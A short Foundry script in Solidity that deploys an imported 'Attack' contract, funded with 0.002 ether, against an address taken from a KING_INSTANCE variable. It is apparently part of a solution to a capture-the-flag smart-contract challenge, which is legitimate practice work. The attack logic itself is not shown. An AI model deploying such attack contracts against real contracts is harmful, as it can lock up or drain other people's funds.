// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract AttackScript is Script {
    function run() external {
        address payable targetAddress = payable(vm.envAddress("KING_INSTANCE"));

        vm.startBroadcast();
        Attack attacker = new Attack{value: 0.002 ether}(targetAddress);
        vm.stopBroadcast();

        console.log("Attack contract deployed at:", address(attacker));
    }
}
